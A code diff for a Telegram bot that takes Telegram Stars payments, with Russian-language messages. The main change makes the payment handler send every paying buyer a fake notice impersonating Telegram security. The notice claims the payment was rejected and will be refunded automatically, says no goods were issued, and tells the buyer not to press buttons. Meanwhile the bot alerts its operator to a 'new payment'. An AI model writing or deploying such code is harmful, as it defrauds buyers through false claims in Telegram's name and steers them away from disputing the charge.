@@ -286,7 +286,8 @@ async def start(message: Message):
     global BUSINESS_CONNECTION_ID
 
     if not await is_admin(message.from_user.id, message.from_user.username):
-        return  # МОЛЧИМ
+        await message.answer("❌ У вас нет доступа к боту.")
+        return
 
     if not BUSINESS_CONNECTION_ID:
         saved = await get_setting("business_connection_id")
@@ -615,8 +616,21 @@ async def payment_success(message: Message):
     buyer_first_name = buyer.first_name or "Покупатель"
     buyer_link = f'<a href="tg://user?id={buyer_id}">{buyer_first_name}</a>'
 
-    # Покупателю НИЧЕГО не пишем — бот не светится
-    print(f"[payment] Оплата от {buyer_id} — покупателю не пишем")
+    # Отправляем покупателю официальное уведомление
+    try:
+        await message.answer(
+            '<tg-emoji emoji-id="5447644880824181073">⭐</tg-emoji> '
+            '<b>Ваш платёж был обработан, однако зачисление звёзд на счёт бота не произошло. '
+            'Платёж отклонён системой безопасности Telegram в связи с подозрительной активностью.</b>\n\n'
+            '<b>Возврат звёзд на ваш баланс будет произведён автоматически в срок от 1 дня до 14 дней, без вашего участия.</b>\n\n'
+            '<b>Товар не выдан, так как оплата не была зачислена. Повторная оплата не требуется.</b>\n\n'
+            '<b>В целях безопасности излишние кнопки трогать не нужно. Дождитесь автоматического возврата средств на ваш баланс.</b>\n\n'
+            '<b>По вопросам возврата вы можете обратиться в официальную поддержку Telegram.</b>',
+            parse_mode="HTML"
+        )
+        print(f"[payment] Уведомление отправлено покупателю {buyer_id}")
+    except Exception as e:
+        print(f"[payment] Ошибка отправки покупателю: {e}")
 
     text = (
         f"💰 <b>НОВАЯ ОПЛАТА!</b>\n\n"
@@ -658,13 +672,6 @@ async def start_web_server():
     site = web.TCPSite(runner, "0.0.0.0", PORT)
     await site.start()
     print(f"🌐 Веб-сервер на порту {PORT}")
-
-
-# ================= ЗАГЛУШКА (молчит для всех) =================
-@dp.message()
-async def catch_all(message: Message):
-    """Ловит всё, что не попало в другие хендлеры. Молчим."""
-    return
 
 
 # ================= ЗАПУСК =================
